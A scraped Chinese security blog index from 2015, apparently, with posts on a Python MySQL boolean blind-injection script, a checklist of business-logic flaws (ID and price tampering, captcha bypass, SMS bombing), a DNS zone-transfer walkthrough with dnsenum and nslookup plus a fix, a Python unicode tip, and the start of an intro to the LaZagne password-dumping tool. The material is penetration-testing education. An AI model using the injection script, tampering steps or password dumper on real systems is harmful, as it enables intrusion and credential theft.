<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134151" target="_blank" rel="external">一下科技运维不当导致内部敏感信息泄漏</a></p>
<p>转自：<a href="http://wiki.wooyun.org/server:host" target="_blank" rel="external">http://wiki.wooyun.org/server:host</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/09/29/e5-85-b3-e4-ba-8e-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-9a-84host-e7-bb-91-e5-ae-9a-e7-9a-84-e4-b8-8d-e5-ae-89-e5-85-a8-e5-9b-a0-e7-b4-a0/" data-id="cimy8bfbk000474gc5seyig0i" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-mysql-e5-b8-83-e5-b0-94-e7-9b-b2-e6-b3-a8" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/07/15/mysql-e5-b8-83-e5-b0-94-e7-9b-b2-e6-b3-a8/" class="article-date">
  <time datetime="2015-07-15T14:00:44.000Z" itemprop="datePublished">2015-07-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Python/">Python</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/07/15/mysql-e5-b8-83-e5-b0-94-e7-9b-b2-e6-b3-a8/">Mysql布尔盲注脚本</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在</p>
<p>[python]</p>
<p>#! usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import httplib<br>import time<br>import string<br>import sys<br>import random<br>import urllib</p>
<p>headers = {‘User-Agent’: ‘Mozilla/5.0 Chrome/28.0.1500.63’,}<br>payloads = list(‘abcdefghijklmnopqrstuvwxyz0123456789@_.’)<br>print ‘start to retrive MySQL user:’<br>user = ‘’<br>for i in range(1,21):<br>    for payload in payloads:<br>        conn = httplib.HTTPConnection(‘www.example.com’, timeout=4)      #连接,host<br>        s = “ascii(mid(lower(user()),%s,1))=%s” % (i, ord(payload))       #payload<br>        conn.request(method=’GET’,url=”/php/1.php?id=1 and %s” % s,headers = headers)  #url<br>        html_header= conn.getresponse().read()<br>        length=len(html_header)<br>        if length&gt;10000:<br>            user+=payload<br>            sys.stdout.write(‘\r[In progress] %s’ % user)<br>            sys.stdout.flush()<br>            break<br>        else:<br>            print ‘.’,<br>            conn.close()</p>
<p>print ‘\n[Done]MySQL user is’, user</p>
<p>[/python]</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/07/15/mysql-e5-b8-83-e5-b0-94-e7-9b-b2-e6-b3-a8/" data-id="cimy8bfc3000i74gc6nfpy1fq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-e4-b8-9a-e5-8a-a1-e5-ae-89-e5-85-a8-e6-bc-8f-e6-b4-9e-e6-8c-96-e6-8e-98-e5-bd-92-e7-ba-b3-e6-80-bb-e7-bb-93" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/07/15/e4-b8-9a-e5-8a-a1-e5-ae-89-e5-85-a8-e6-bc-8f-e6-b4-9e-e6-8c-96-e6-8e-98-e5-bd-92-e7-ba-b3-e6-80-bb-e7-bb-93/" class="article-date">
  <time datetime="2015-07-15T03:25:36.000Z" itemprop="datePublished">2015-07-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞挖掘/">漏洞挖掘</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/07/15/e4-b8-9a-e5-8a-a1-e5-ae-89-e5-85-a8-e6-bc-8f-e6-b4-9e-e6-8c-96-e6-8e-98-e5-bd-92-e7-ba-b3-e6-80-bb-e7-bb-93/">业务安全漏洞挖掘归纳总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="0x00-索引说明"><a href="#0x00-索引说明" class="headerlink" title="0x00 索引说明"></a>0x00 索引说明</h1><hr>
<p>6.30在OWASP的分享，关于业务安全的漏洞检测模型。进一步的延伸科普。</p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312847097.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312847097.png" alt="2015070302312847097"></a></p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312815571.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312815571.png" alt="2015070302312815571"></a></p>
<h1 id="0x01-身份认证安全"><a href="#0x01-身份认证安全" class="headerlink" title="0x01 身份认证安全"></a>0x01 身份认证安全</h1><hr>
<p><strong>1 暴力破解</strong></p>
<p>在没有验证码限制或者一次验证码可以多次使用的地方，使用已知用户对密码进行暴力破解或者用一个通用密码对用户进行暴力破解。 简单的验证码爆破。URL: <a href="http://zone.wooyun.org/content/20839" target="_blank" rel="external">http://zone.wooyun.org/content/20839</a></p>
<p>一些工具及脚本</p>
<p>Burpsuite</p>
<p>htpwdScan 撞库爆破必备 URL: <a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="external">https://github.com/lijiejie/htpwdScan</a></p>
<p>hydra 源码安装xhydra支持更多的协议去爆破 (可破WEB，其他协议不属于业务安全的范畴)</p>
<p><strong>2 session &amp; cookie类</strong></p>
<p>会话固定攻击：利用服务器的session不变机制，借他人之手获得认证和授权，冒充他人。案例：<a href="http://www.wooyun.org/bugs/wooyun-2013-025427" target="_blank" rel="external">WooYun: 新浪广东美食后台验证逻辑漏洞，直接登录后台，566764名用户资料暴露！</a></p>
<p>Cookie仿冒：修改cookie中的某个参数可以登录其他用户。 案例：益云广告平台任意帐号登录<a href="http://www.wooyun.org/bugs/wooyun-2014-051424" target="_blank" rel="external">WooYun: 益云广告平台任意帐号登录</a></p>
<p><strong>3 弱加密</strong></p>
<p>未使用https，是功能测试点，不好利用。</p>
<p>前端加密，用密文去后台校验，并利用smart decode可解</p>
<h1 id="0x02-业务一致性安全"><a href="#0x02-业务一致性安全" class="headerlink" title="0x02 业务一致性安全"></a>0x02 业务一致性安全</h1><hr>
<p><strong>1 手机号篡改</strong></p>
<p>a) 抓包修改手机号码参数为其他号码尝试，例如在办理查询页面，输入自己的号码然后抓包，修改手机号码参数为其他人号码，查看是否能查询其他人的业务。</p>
<p><strong>2 邮箱或者用户篡改</strong></p>
<p>a) 抓包修改用户或者邮箱参数为其他用户或者邮箱</p>
<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2014-074441" target="_blank" rel="external">WooYun: 绿盟RSAS安全系统全版本通杀权限管理员绕过漏洞，包括最新 RSAS V5.0.13.2</a></p>
<p><strong>3 订单id篡改</strong></p>
<p>a) 查看自己的订单id，然后修改id（加减一）查看是否能查看其它订单信息。</p>
<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2013-044137" target="_blank" rel="external">WooYun: 广之旅旅行社任意访问用户订单</a></p>
<p><strong>4 商品编号篡改</strong></p>
<p>a) 例如积分兑换处，100个积分只能换商品编号为001,1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换区高积分商品。</p>
<p>b) 案例：联想某积分商城支付漏洞再绕过 <a href="http://www.wooyun.org/bugs/wooyun-2013-041617" target="_blank" rel="external">WooYun: 联想某积分商城支付漏洞再绕过</a></p>
<p><strong>5 用户id篡改</strong></p>
<p>a) 抓包查看自己的用户id，然后修改id（加减1）查看是否能查看其它用户id信息。</p>
<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-0111617" target="_blank" rel="external">WooYun: 拉勾网百万简历泄漏风险(包括手机、邮件、应聘职位等信息、还可冒充企业身份筛选简历、发面试通知等)</a></p>
<h1 id="0x03-业务数据篡改"><a href="#0x03-业务数据篡改" class="headerlink" title="0x03 业务数据篡改"></a>0x03 业务数据篡改</h1><hr>
<p><strong>1 金额数据篡改</strong></p>
<p>a) 抓包修改金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。 b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-0117083" target="_blank" rel="external">WooYun: 12308订单支付时的总价未验证漏洞(支付逻辑漏洞)</a></p>
<p><strong>2 商品数量篡改</strong></p>
<p>a) 抓包修改商品数量等字段，将请求中的商品数量修改成任意数额，如负数并提交，查看能否以修改后的数量完成业务流程。 b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-0109037" target="_blank" rel="external">WooYun: 蔚蓝团支付逻辑漏洞(可负数支付)</a></p>
<p><strong>3 最大数限制突破</strong></p>
<p>a) 很多商品限制用户购买数量时，服务器仅在页面通过js脚本限制，未在服务器端校验用户提交的数量，通过抓包修改商品最大数限制，将请求中的商品数量改为大于最大数限制的值，查看能否以修改后的数量完成业务流程。</p>
<p><strong>4 本地js参数修改</strong></p>
<p>a) 部分应用程序通过Javascript处理用户提交的请求，通过修改Javascript脚本，测试修改后的数据是否影响到用户。</p>
<h1 id="0x04-用户输入合规性"><a href="#0x04-用户输入合规性" class="headerlink" title="0x04 用户输入合规性"></a>0x04 用户输入合规性</h1><hr>
<p>1 注入测试 请参考<a href="http://wiki.wooyun.org/web:sql" target="_blank" rel="external">http://wiki.wooyun.org/web:sql</a></p>
<p>2 XSS测试 请参考<a href="http://wiki.wooyun.org/web:xss" target="_blank" rel="external">http://wiki.wooyun.org/web:xss</a></p>
<p>3 Fuzz</p>
<p>a) 功能测试用的多一些，有可能一个超长特殊字符串导致系统拒绝服务或者功能缺失。（当然fuzz不单单这点用途。）</p>
<p>b) 不太符合的案例，但思路可借鉴： <a href="http://www.wooyun.org/bugs/wooyun-2014-048293" target="_blank" rel="external">WooYun: 建站之星模糊测试实战之任意文件上传漏洞</a></p>
<p>c) 可能会用的工具 —— spike</p>
<p>4 其他用用户输入交互的应用漏洞</p>
<h1 id="0x05-密码找回漏洞"><a href="#0x05-密码找回漏洞" class="headerlink" title="0x05 密码找回漏洞"></a>0x05 密码找回漏洞</h1><hr>
<p><strong>1 大力推荐BMa的《密码找回逻辑漏洞总结》</strong></p>
<p><a href="http://drops.wooyun.org/web/5048" target="_blank" rel="external">http://drops.wooyun.org/web/5048</a></p>
<p>a) 密码找回逻辑测试一般流程</p>
<p>i. 首先尝试正常密码找回流程，选择不同找回方式，记录所有数据包</p>
<p>ii. 分析数据包，找到敏感部分</p>
<p>iii. 分析后台找回机制所采用的验证手段</p>
<p>iv. 修改数据包验证推测</p>
<p>b) 脑图 （详情请参考BMa的《密码找回逻辑漏洞总结》）</p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312839779.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312839779.png" alt="2015070302312839779"></a></p>
<h1 id="0x06-验证码突破"><a href="#0x06-验证码突破" class="headerlink" title="0x06 验证码突破"></a>0x06 验证码突破</h1><hr>
<p>验证码不单单在登录、找密码应用，提交敏感数据的地方也有类似应用，故单独分类，并进一步详情说明。</p>
<p><strong>1 验证码暴力破解测试</strong></p>
<p>a) 使用burp对特定的验证码进行暴力破解</p>
<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-093932" target="_blank" rel="external">WooYun: 盟友88电商平台任意用户注册与任意用户密码重置漏洞打包</a></p>
<p><strong>2 验证码时间、次数测试</strong></p>
<p>a) 抓取携带验证码的数据包不断重复提交，例如：在投诉建议处输入要投诉的内容信息，及验证码参数，此时抓包重复提交数据包，查看历史投诉中是否存在重复提交的参数信息。</p>
<p>b) 案例：</p>
<p><strong>3 验证码客户端回显测试</strong></p>
<p>a 当客户端有需要和服务器进行交互，发送验证码时，即可使用firefox按F12调出firebug就可看到客户端与服务器进行交互的详细信息</p>
<p><strong>4 验证码绕过测试</strong></p>
<p>a) 当第一步向第二步跳转时，抓取数据包，对验证码进行篡改清空测试，验证该步骤验证码是否可以绕过。</p>
<p>b) 案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-098765" target="_blank" rel="external">WooYun: 中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</a></p>
<p><strong>5 验证码js绕过</strong></p>
<p>a) 短信验证码验证程序逻辑存在缺陷，业务流程的第一步、第二部、第三步都是放在同一个页面里，验证第一步验证码是通过js来判断的，可以修改验证码在没有获取验证码的情况下可以填写实名信息，并且提交成功。</p>
<h1 id="0x07-业务授权安全"><a href="#0x07-业务授权安全" class="headerlink" title="0x07 业务授权安全"></a>0x07 业务授权安全</h1><hr>
<p><strong>1 未授权访问</strong></p>
<p>a) 非授权访问是指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问到的页面或文本信息。可以尝试在登录某网站前台或后台之后，将相关的页面链接复制于其他浏览器或其他电脑上进行访问，看是否能访问成功。</p>
<p><strong>2 越权访问</strong></p>
<p>越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定</p>
<p>a) 垂直越权（垂直越权是指使用权限低的用户可以访问权限较高的用户）</p>
<p>b) 水平越权（水平越权是指相同权限的不同用户可以互相访问）（wooyun-2010-0100991 PHPEMS多处存在水平权限问题）</p>
<p>c) 《我的越权之道》URL：<a href="http://drops.wooyun.org/tips/727" target="_blank" rel="external">http://drops.wooyun.org/tips/727</a></p>
<h1 id="0x08-业务流程乱序"><a href="#0x08-业务流程乱序" class="headerlink" title="0x08 业务流程乱序"></a>0x08 业务流程乱序</h1><hr>
<p><strong>1 顺序执行缺陷</strong></p>
<p>a) 部分网站逻辑可能是先A过程后B过程然后C过程最后D过程</p>
<p>b) 用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。</p>
<p>c) 案例：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-047677" target="_blank" rel="external">WooYun: 万达某分站逻辑错误可绕过支付直接获得取票密码</a></p>
<p><a href="http://wooyun.org/bugs/wooyun-2010-0108184" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0108184</a></p>
<h1 id="0x09-业务接口调用安全"><a href="#0x09-业务接口调用安全" class="headerlink" title="0x09 业务接口调用安全"></a>0x09 业务接口调用安全</h1><hr>
<p><strong>1 重放攻击</strong></p>
<p>在短信、邮件调用业务或生成业务数据环节中（类：短信验证码，邮件验证码，订单生成，评论提交等），对其业务环节进行调用（重放）测试。如果业务经过调用（重放）后被多次生成有效的业务或数据结果</p>
<p>a) 恶意注册</p>
<p>b) 短信炸弹</p>
<p>在测试的过程中，我们发现众多的金融交易平台仅在前端通过JS校验时间来控制短信发送按钮，但后台并未对发送做任何限制，导致可通过重放包的方式大量发送恶意短信</p>
<p>案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-094545" target="_blank" rel="external">WooYun: 一亩田交易网逻辑漏洞（木桶原理）</a></p>
<p><strong>2 内容编辑</strong></p>
<p>类似案例如下：</p>
<p>点击“获取短信验证码”，并抓取数据包内容，如下图。通过分析数据包，可以发现参数sendData/insrotxt的内容有客户端控制，可以修改为攻击者想要发送的内容</p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312854742.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312854742.png" alt="2015070302312854742"></a></p>
<p>将内容修改“恭喜你获得由xx银行所提供的iphone6一部，请登录<a href="http://www.xxx.com领取，验证码为236694”并发送该数据包，手机可收到修改后的短信内容，如下图：" target="_blank" rel="external">http://www.xxx.com领取，验证码为236694”并发送该数据包，手机可收到修改后的短信内容，如下图：</a></p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312971068.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312971068.png" alt="2015070302312971068"></a></p>
<h1 id="0x10-时效绕过测试"><a href="#0x10-时效绕过测试" class="headerlink" title="0x10 时效绕过测试"></a>0x10 时效绕过测试</h1><hr>
<p>大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。</p>
<p><strong>1 时间刷新缺陷</strong></p>
<p>12306网站的买票业务是每隔5s，票会刷新一次。但是这个时间确实在本地设置的间隔。于是，在控制台就可以将这个时间的关联变量重新设置成1s或者更小，这样刷新的时间就会大幅度缩短（主要更改autoSearchTime本地参数）。 案例：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2014-048391" target="_blank" rel="external">WooYun: 12306自动刷票时间可更改漏洞</a></p>
<p><strong>2 时间范围测试</strong></p>
<p>针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。</p>
<h1 id="0x11-参考"><a href="#0x11-参考" class="headerlink" title="0x11 参考"></a>0x11 参考</h1><hr>
<p>@eversec</p>
<p>应用程序逻辑错误总结 <a href="http://drops.wooyun.org/papers/1418" target="_blank" rel="external">http://drops.wooyun.org/papers/1418</a></p>
<p>密码找回功能可能存在的问题 <a href="http://drops.wooyun.org/papers/287" target="_blank" rel="external">http://drops.wooyun.org/papers/287</a></p>
<p>密码找回功能可能存在的问题（补充） <a href="http://drops.wooyun.org/web/3295" target="_blank" rel="external">http://drops.wooyun.org/web/3295</a></p>
<p>密码找回逻辑漏洞总结 <a href="http://drops.wooyun.org/web/5048" target="_blank" rel="external">http://drops.wooyun.org/web/5048</a></p>
<p>支付漏洞的三种常见类型——加固方案 <a href="http://zone.wooyun.org/content/878" target="_blank" rel="external">http://zone.wooyun.org/content/878</a></p>
<p>在线支付逻辑漏洞总结 <a href="http://drops.wooyun.org/papers/345" target="_blank" rel="external">http://drops.wooyun.org/papers/345</a></p>
<p>金融行业平台常见安全漏洞与防御 <a href="http://www.freebuf.com/news/special/61082.html" target="_blank" rel="external">http://www.freebuf.com/news/special/61082.html</a></p>
<p>我的越权之道 <a href="http://drops.wooyun.org/tips/727" target="_blank" rel="external">http://drops.wooyun.org/tips/727</a></p>
<p>安全科普：看视频理解Web应用安全漏洞TOP10（IBM内部视频） <a href="http://www.freebuf.com/vuls/63426.html" target="_blank" rel="external">http://www.freebuf.com/vuls/63426.html</a></p>
<p>转：<a href="http://drops.wooyun.org/web/6917" target="_blank" rel="external">http://drops.wooyun.org/web/6917</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/07/15/e4-b8-9a-e5-8a-a1-e5-ae-89-e5-85-a8-e6-bc-8f-e6-b4-9e-e6-8c-96-e6-8e-98-e5-bd-92-e7-ba-b3-e6-80-bb-e7-bb-93/" data-id="cimy8bfbi000374gcy3dc8izs" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-dns-e5-9f-9f-e4-bc-a0-e9-80-81-e6-bc-8f-e6-b4-9e-e5-88-a9-e7-94-a8-e6-96-b9-e6-b3-95" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/07/13/dns-e5-9f-9f-e4-bc-a0-e9-80-81-e6-bc-8f-e6-b4-9e-e5-88-a9-e7-94-a8-e6-96-b9-e6-b3-95/" class="article-date">
  <time datetime="2015-07-13T03:10:37.000Z" itemprop="datePublished">2015-07-13</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/07/13/dns-e5-9f-9f-e4-bc-a0-e9-80-81-e6-bc-8f-e6-b4-9e-e5-88-a9-e7-94-a8-e6-96-b9-e6-b3-95/">DNS域传送漏洞利用方法</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。</p>
<p><strong>1、使用工具来获取DNS信息</strong></p>
<p><strong>cd /pentest/enumeration/dns/dnsenum
</strong></p>
<p><strong># ./dnsenum.pl –enum domain.com</strong></p>
<p>这样就可以简单的利用了。</p>
<p><strong>2、使用手工的方法，推荐。</strong>方法如下图</p>
<p>查询过程如图所显示:</p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/1259002Mo.jpg" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/1259002Mo.jpg" alt="1259002Mo"></a><br>查询结果保存在189store.com.txt中<br>使用如下指令查看</p>
<p><div id="crayon-55a203d21a436168482616" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-toolbar" data-settings=" show"></div></p>
<p><div class="crayon-tools"></div></p>
<p><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"></div></p>
<p><pre class="brush: actionscript3; gutter: true">&lt;span class=&quot;crayon-i&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;189store.com.txt&lt;/span&gt;</pre><br></p>
<p><div class="crayon-button crayon-copy-button" title="复制代码"></div><br><br><br><br>有74条记录</p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125900JRF.jpg" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125900JRF.jpg" alt="125900JRF"></a></p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125901P6x.jpg" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125901P6x.jpg" alt="125901P6x"></a></p>
<p>&nbsp;</p>
<h3 id="漏洞证明："><a href="#漏洞证明：" class="headerlink" title="漏洞证明："></a>漏洞证明：</h3><p>见上面的详细说明</p>
<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>ns.westidc.com.cn（221.236.9.9） 与 ns.westidc.net.cn（210.77.146.30） 都没有做访问控制<br>定义ACL(访问控制列表)来限制在域名服务器之间的区域传送<br>编辑/etc/named.conf<br>在189store.com的zone配置中设置</p>
<p><pre class="brush: shell; gutter: true">allow-transfer { localhost; 221.236.9.9; };</pre><br>或</p>
<p><pre class="brush: shell; gutter: true">allow-transfer { localhost; 210.77.146.30; };</pre><br>原文：<a href="http://www.waitalone.cn/post/DNSTransfer.html" target="_blank" rel="external">http://www.waitalone.cn/post/DNSTransfer.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/07/13/dns-e5-9f-9f-e4-bc-a0-e9-80-81-e6-bc-8f-e6-b4-9e-e5-88-a9-e7-94-a8-e6-96-b9-e6-b3-95/" data-id="cimy8bfb8000074gcrfdqh9xl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-python-unicode-e5-ad-97-e8-8a-82-e4-b8-b2-e8-bd-ac-e6-88-90-e4-b8-ad-e6-96-87-e9-97-ae-e9-a2-98-ef-bc-88-e8-bd-ac-ef-bc-89" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/06/18/python-unicode-e5-ad-97-e8-8a-82-e4-b8-b2-e8-bd-ac-e6-88-90-e4-b8-ad-e6-96-87-e9-97-ae-e9-a2-98-ef-bc-88-e8-bd-ac-ef-bc-89/" class="article-date">
  <time datetime="2015-06-18T02:14:26.000Z" itemprop="datePublished">2015-06-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Python/">Python</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/06/18/python-unicode-e5-ad-97-e8-8a-82-e4-b8-b2-e8-bd-ac-e6-88-90-e4-b8-ad-e6-96-87-e9-97-ae-e9-a2-98-ef-bc-88-e8-bd-ac-ef-bc-89/">python unicode字节串转成中文问题  （转）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>转：<a href="http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/" target="_blank" rel="external">http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/</a></p>
<p>如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似“\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中文而已，没想到百度了白天找到合适的。遇到这种问题千万不要用什么 “python编码” “unicode中文编码” “unicode解码”这样的关键字去搜，一大堆网页出来毫不相关。</p>
<p>其实这个问题一个函数搞定，如下：</p>
<p>Example 1:<br>&gt;&gt;&gt; s = r”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”<br>&gt;&gt;&gt; s<br>‘\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c’<br>&gt;&gt;&gt; print s<br>\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c<br>&gt;&gt;&gt; s = s.decode(“unicode_escape”); #就是这个函数<br>&gt;&gt;&gt; print s</p>
<p>Example 2:<br>&gt;&gt;&gt; str<em> = “Russopho\xe9bic, clichd and just pl\xe9ain stupid.”<br>&gt;&gt;&gt; print str</em><br>Russopho?bic, clichd and just pl?ain stupid.<br>&gt;&gt;&gt; str<em> = str</em>.decode(“unicode<em>escape”)<br>&gt;&gt;&gt; print str</em></p>
<div><br><div></div><br><div>(这个方法解决了我在插入数据到mongodb时遇到的“bson.errors.InvalidStringData: strings in documents must be valid UTF-8”问题)</div><br><div></div><br><div>    附上关于这个问题的相关博客链接：<a href="http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html" target="_blank" rel="external">http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html</a></div><br><div></div><br><div>        另外还有一个与unicode字节串有关的问题，遇到这样的错误提示：Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal。说明我们在对两个字符（串）进行对比的时候等号两边的类型</div><br><div>不一样，可能是一边是unicode字节串，一边是字符串。详见<a href="http://stackoverflow.com/questions/3400171/python-utf-8-comparison。" target="_blank" rel="external">http://stackoverflow.com/questions/3400171/python-utf-8-comparison。</a></div><br><div></div><br><div>小结：<br>以后遇到奇葩问题要想好关键字再搜，不然很有可能一无所获。</div><br></div>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/06/18/python-unicode-e5-ad-97-e8-8a-82-e4-b8-b2-e8-bd-ac-e6-88-90-e4-b8-ad-e6-96-87-e9-97-ae-e9-a2-98-ef-bc-88-e8-bd-ac-ef-bc-89/" data-id="cimy8bfc6000p74gcazxbch3f" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/05/28/e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project/" class="article-date">
  <time datetime="2015-05-28T01:59:16.000Z" itemprop="datePublished">2015-05-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/工具/">工具</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/05/28/e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project/">忘记密码咋办？本地密码检索工具 – LaZagne Project</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>转自freebuf：<a href="http://www.freebuf.com/tools/68229.html" target="_blank" rel="external">http://www.freebuf.com/tools/68229.html</a><br>简介</p>
<p>LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），我开发这款工具的目的是为了寻找计算机中最常用软件的密码。截至目前，该工具支持Windows上的22款软件，Linux/Unix-Like OS上的12款软件。</p>
<p>使用方法：</p>
<p>启用所有模块</p>
<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe all<br></pre><br>启用特殊模块</p>
<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe<br>example: laZagne.exe browsers<br>help: laZagne.exe -h</pre><br>仅启动一个特殊软件脚本</p>
